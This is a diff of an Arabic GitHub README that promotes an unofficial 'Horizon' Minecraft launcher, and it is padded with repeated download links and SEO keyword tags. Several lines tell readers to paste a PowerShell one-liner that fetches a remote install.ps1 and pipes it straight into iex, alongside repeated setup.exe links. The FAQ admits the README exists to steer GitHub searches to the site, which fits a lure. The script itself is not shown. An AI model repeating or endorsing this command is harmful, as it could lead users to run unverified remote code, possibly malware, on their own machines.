@@ -69,7 +69,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
   <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases"><img alt="releases" src="https://img.shields.io/badge/Releases-0.2.0_to_0.2.69-blue"></a>
 </p>
 
-<p align="center"><em>Launcher <strong>0.2.69</strong> · LGPL · Win+R · UAC · <a href="https://horizonlauncher.net/ar/">horizonlauncher.net</a></em></p>
+<p align="center"><em>تحديث 2026-11-16: المشغّل <strong>0.2.69</strong>، LGPL، Win+R، UAC. <a href="https://horizonlauncher.net/ar/">horizonlauncher.net</a>.</em></p>
 
 [![Horizon Minecraft](https://horizonlauncher.net/media/social-preview.jpg)](https://horizonlauncher.net/ar/)
 
@@ -127,9 +127,17 @@ Horizon **ليس** من Mojang / Microsoft. نزّله فقط من **horizonlaun
 
 ## المحتويات
 
-1. [مقارنة المشغّل](#مقارنة-المشغّل)
-2. [FAQ](#faq)
-3. [صفحات الموقع](#صفحات-الموقع)
+1. [ما هو Horizon Minecraft](#ما-هو-horizon-minecraft)
+2. [تنزيل Horizon مجاناً (Windows)](#تنزيل-horizon-مجانا-windows)
+3. [كيفية تثبيت Horizon — طريقتان](#كيفية-تثبيت-horizon-طريقتان)
+4. [ميزات Horizon Minecraft (عميل Java بلغة Rust)](#ميزات-horizon-minecraft-عميل-java-بلغة-rust)
+5. [لماذا ماينكرافت بـ Rust](#لماذا-ماينكرافت-بـ-rust)
+6. [مقارنة المشغّلات](#مقارنة-المشغلات)
+7. [السيرفرات والمودات وFPS](#السيرفرات-والمودات-وfps)
+8. [الأسئلة الشائعة](#الأسئلة-الشائعة)
+9. [صفحات الموقع](#صفحات-الموقع)
+10. [English — Download Horizon Minecraft launcher](#english-download-horizon-minecraft-launcher)
+11. [وسوم SEO وكلمات البحث](#وسوم-seo-وكلمات-البحث)
 
 ---
 
@@ -260,21 +268,26 @@ Win+R: `irm https://horizonlauncher.net/install.ps1 | iex` · **[horizon-launche
 
 المزيد: [https://horizonlauncher.net/en/minecraft-rust/](https://horizonlauncher.net/en/minecraft-rust/) · [https://horizonlauncher.net/en/performance/](https://horizonlauncher.net/en/performance/)
 
-## مقارنة المشغّل
+## مقارنة المشغّلات
 
-| | Official launcher | JVM launchers | **Horizon** |
+| | مشغّل Minecraft الرسمي | Prism / MultiMC | **Horizon** |
 |---|---|---|---|
-| Download | minecraft.net | GitHub | **[https://horizonlauncher.net/ar/](https://horizonlauncher.net/ar/)** |
-| Client | JVM | JVM | **Rust (Minecraft Rust Edition)** |
-| Setup | vendor installer | vendor | **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** |
+| التنزيل | minecraft.net | GitHub | **[https://horizonlauncher.net/ar/](https://horizonlauncher.net/ar/)** |
+| العميل | JVM | JVM | **Rust (Minecraft Rust Edition)** |
+| الهدف | الترخيص | حزم المود | **FPS + عميل Windows أصلي** |
+| التثبيت | setup | setup | **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** |
 
-Canonical download: **horizonlauncher.net** only.
+عميل غير رسمي. التنزيل من **horizonlauncher.net** فقط.
 
-## السيرفرات والمودات
+## السيرفرات والمودات وFPS
 
-- **Servers / mods / FPS / legal:** [https://horizonlauncher.net/ar/](https://horizonlauncher.net/ar/) · [https://horizonlauncher.net/ar/download-horizon/](https://horizonlauncher.net/ar/download-horizon/)
-- **Distant Horizons · Create · shaders:** [https://horizonlauncher.net/en/distant-horizons/](https://horizonlauncher.net/en/distant-horizons/) (EN guides)
-- **Releases 0.2.69:** [https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)
+- **سيرفرات Minecraft Java:** [https://horizonlauncher.net/ar/server/](https://horizonlauncher.net/ar/server/)
+- **مودات** `.hnmod`: [https://horizonlauncher.net/ar/mods/](https://horizonlauncher.net/ar/mods/) · [Distant Horizons](https://horizonlauncher.net/ar/distant-horizons/) · [Create](https://horizonlauncher.net/ar/create-mod/) · [الشيدر](https://horizonlauncher.net/ar/shaders/)
+- **الأداء:** [https://horizonlauncher.net/ar/performance/](https://horizonlauncher.net/ar/performance/) · **FAQ:** [https://horizonlauncher.net/ar/faq/](https://horizonlauncher.net/ar/faq/) · **LGPL:** [https://horizonlauncher.net/ar/legal/](https://horizonlauncher.net/ar/legal/)
+
+### عمليات بحث شائعة
+
+`تنزيل Horizon Minecraft` · `Horizon launcher Windows` · `Horizon 0.2.69` · [Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)
 
 ## الأسئلة الشائعة
 
@@ -299,37 +312,46 @@ Canonical download: **horizonlauncher.net** only.
 **سجل التغيير 0.2.65–0.2.69؟**  
 [Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases) · اللانشر **0.2.69** [https://horizonlauncher.net/ar/](https://horizonlauncher.net/ar/)
 
-**Win 7 / macOS / Linux?**  
-Official setup targets **Windows 10/11 x64**. See [https://horizonlauncher.net/download-horizon/](https://horizonlauncher.net/download-horizon/).
+**Windows 7 / macOS / Linux?**  
+Setup targets **Windows 10/11 x64**. See [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/).
 
-**Why this GitHub README?**  
-So searches like «Horizon launcher github» lead to canonical **[horizonlauncher.net](https://horizonlauncher.net/)**.
+**Russian version?**  
+[https://horizonlauncher.net/](https://horizonlauncher.net/) — скачать Horizon (README.md).
+
+**Why GitHub if the site exists?**  
+So «Horizon launcher github» points to **[horizonlauncher.net](https://horizonlauncher.net/en/)**.
 
 ## صفحات الموقع
 
-**AR / local:** [https://horizonlauncher.net/ar/](https://horizonlauncher.net/ar/) · [https://horizonlauncher.net/ar/download-horizon/](https://horizonlauncher.net/ar/download-horizon/) · [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
+**AR:** [https://horizonlauncher.net/ar/](https://horizonlauncher.net/ar/) · [https://horizonlauncher.net/ar/download-horizon/](https://horizonlauncher.net/ar/download-horizon/) · [https://horizonlauncher.net/ar/install-horizon/](https://horizonlauncher.net/ar/install-horizon/) · [https://horizonlauncher.net/ar/minecraft-rust/](https://horizonlauncher.net/ar/minecraft-rust/) · [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
 
 **EN:** [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · **RU:** [https://horizonlauncher.net/](https://horizonlauncher.net/) · [sitemap](https://horizonlauncher.net/sitemap.xml) · [Telegram](https://t.me/horizonlauncher)
 
 
+## English — Download Horizon Minecraft launcher
+
+**Horizon** — free **Windows Minecraft launcher** and **Java client in Rust**. [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) · **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** · **0.2.69**.
+
 
 ## وسوم SEO وكلمات البحث
 
-`download Horizon` `Horizon 0.2.69` `horizonlauncher.net` `Minecraft Rust Edition` `horizon-launcher-setup.exe` `Win+R Horizon` `LGPL Horizon`
+`تنزيل Horizon` `Horizon launcher` `Minecraft على Rust` `Horizon 0.2.69` `horizonlauncher.net`
 
-### Download / Win+R / setup.exe
+`تنزيل Horizon` `مشغل Horizon` `ماينكرافت Rust` `Minecraft Rust Edition` `تحميل ماينكرافت ويندوز` `horizonlauncher.net` `Win+R Horizon` `تثبيت Horizon سريع` `setup Horizon` `تنزيل Horizon` `Distant Horizons Horizon` `Create Horizon`
 
-- Site: [https://horizonlauncher.net/](https://horizonlauncher.net/)
-- Download: [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/)
+### تنزيل / Win+R / setup.exe
+
+- [https://horizonlauncher.net/](https://horizonlauncher.net/)
+- [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/)
 - Win+R: `powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"`
-- Setup: [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
-- EN: [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/)
-- Minecraft on Rust: [https://horizonlauncher.net/minecraft-rust/](https://horizonlauncher.net/minecraft-rust/) · [https://horizonlauncher.net/en/minecraft-rust/](https://horizonlauncher.net/en/minecraft-rust/)
-- Telegram: [https://t.me/horizonlauncher](https://t.me/horizonlauncher)
-- Sitemap: [https://horizonlauncher.net/sitemap.xml](https://horizonlauncher.net/sitemap.xml)
+- [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
+- [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/)
+- [https://horizonlauncher.net/minecraft-rust/](https://horizonlauncher.net/minecraft-rust/) · [https://horizonlauncher.net/en/minecraft-rust/](https://horizonlauncher.net/en/minecraft-rust/)
+- [https://t.me/horizonlauncher](https://t.me/horizonlauncher)
+- [https://horizonlauncher.net/sitemap.xml](https://horizonlauncher.net/sitemap.xml)
 
 
-**Horizon:** [https://horizonlauncher.net/ar/](https://horizonlauncher.net/ar/) · [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
+**تنزيل:** [https://horizonlauncher.net/ar/](https://horizonlauncher.net/ar/) · [https://horizonlauncher.net/ar/download-horizon/](https://horizonlauncher.net/ar/download-horizon/) · [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
 
 
 </div>
